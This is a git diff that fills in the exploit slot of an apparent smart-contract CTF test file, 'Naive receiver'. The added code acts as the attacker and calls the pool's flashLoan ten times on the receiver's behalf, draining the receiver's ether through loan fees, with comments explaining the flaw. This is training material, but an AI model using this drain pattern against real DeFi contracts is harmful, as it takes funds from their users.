@@ -30,7 +30,34 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */
+
+        // connect as the attacker.
+        this.pool = this.pool.connect(attacker);
+        this.receiver = this.receiver.connect(attacker);
+        
+        // get the initial balance of the pool
+        var poolBalance = await ethers.provider.getBalance(this.pool.address);
+        // get the initial balance of the receiver
+        var receiverBalance = await ethers.provider.getBalance(this.receiver.address);
+
+        console.log("Initial pool balance: " + poolBalance);
+        console.log("Initial receiver balance: " + receiverBalance);
+
+        for (var i = 0; i < 10; i++) {
+
+            // flashLoan on the receiver's address until no ether left
+            await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('1'));
+            // this was the issue; anyone could do a flashLoan on somebody else's behalf(as long as restrictions were met) and hence drain the account.
+
+            receiverBalance = await ethers.provider.getBalance(this.receiver.address);
+            console.log("#" + i + " flashloan. current receiver balance: " + receiverBalance);
+        }
+
+        // get the updated balance of the pool
+        poolBalance = await ethers.provider.getBalance(this.pool.address);
+        console.log("Updated pool balance: " + poolBalance);
+
     });
 
     after(async function () {
